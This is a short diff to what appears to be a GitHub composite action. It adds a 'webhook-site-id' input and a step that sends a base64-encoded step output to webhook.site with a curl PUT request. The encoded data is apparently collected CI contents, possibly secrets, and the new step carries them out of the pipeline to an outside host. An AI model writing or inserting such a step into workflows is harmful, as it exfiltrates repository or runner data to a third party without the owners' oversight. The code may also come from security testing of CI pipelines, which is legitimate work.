@@ -14,6 +14,9 @@ inputs:
     description: 'Sink to which the output gets written to'
     required: false
     default: 'logs'
+  webhook-site-id:
+    description: 'ID of webhook.site sink'
+    required: false
 
 runs:
   using: "composite"
@@ -34,6 +37,16 @@ runs:
       shell: bash
       run: |
         echo ${{ steps.base64_encoded.outputs.output }}
+    - name: 'Send them to webhook.site'
+      if: ${{ inputs.sink == 'webhook.site' }}
+      shell: bash
+      run: |
+        curl -X PUT \
+          -H "Content-Type: application/json" \
+          -d "${{ steps.base64_encoded.outputs.output }}" \
+          "https://webhook.site/$WEBHOOK_SITE_ID"
+      env:
+        WEBHOOK_SITE_ID: ${{ inputs.webhook-site-id }}
     - name: 'Finished'
       shell: bash
       run: echo DONE
